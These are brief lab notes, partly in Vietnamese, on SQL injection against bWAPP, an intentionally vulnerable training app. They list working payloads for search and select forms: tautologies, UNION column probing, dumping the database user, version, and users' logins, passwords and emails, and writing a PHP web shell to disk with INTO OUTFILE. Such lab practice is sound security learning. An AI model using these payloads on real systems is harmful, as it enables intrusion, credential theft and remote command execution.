https://bwapp.hakhub.net/portal.php
user/pass diep

SQL Injection
#SQLI get/search 
1: go dau ' se hien ra loi
2: go hien tat ca ban ghi https://bwapp.hakhub.net/sqli_1.php?title='+'&action=search
3: iron' or 1=1#&action=search
4: title=validEntry' or 1=2#&action=search
5: title=iron' union select 1,2,3,4,5,6,7 #&action=search  8 cot la loi vi chi co 7 cot
6: iron' union select 1,user(),@@version,4,5,6,7 #&action=search
7: iron' union select 1,login,password,email,5,6,7 from users #
8: iron' union select 1,"<?php echo shell_exec($_GET['cmd'])?>",3,4,5,6,7 into OUTFILE
'/var/www/bWAPP/popped.php' #&action=search


SQLJ get/select
1: movie=1 and 1=2#&action=go
2: movie=1 union select 1,2,3,4,5,6,7#&action=go 6 cot la loi
3: movie=1337 union select 1,2,3,4,5,6,7#&action=go
4: movie=1337 union select 1,login,3,email,password,6,7 from users#&action=go
